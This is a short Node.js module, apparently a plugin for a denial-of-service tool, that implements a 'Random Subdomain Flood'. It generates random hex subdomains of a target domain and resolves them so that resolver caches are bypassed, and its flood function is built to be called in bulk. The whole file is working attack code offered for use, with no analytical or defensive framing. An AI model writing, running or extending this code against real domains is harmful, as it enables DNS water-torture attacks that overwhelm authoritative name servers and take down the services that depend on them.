const dns = require('dns');
const crypto = require('crypto');

module.exports = {
    name: 'Random Subdomain Flood',
    description: 'Queries random subdomains to bypass cache',
    
    execute: async (target, port) => {
        const subdomain = `${crypto.randomBytes(8).toString('hex')}.${target}`;
        return new Promise((resolve, reject) => {
            dns.resolve4(subdomain, (err) => {
                if (err) reject(err);
                else resolve({ subdomain });
            });
        });
    },
    
    flood: (target, port, callback) => {
        const subdomain = `${crypto.randomBytes(8).toString('hex')}.${target}`;
        dns.resolve4(subdomain, (err) => {
            callback(!err);
        });
    }
};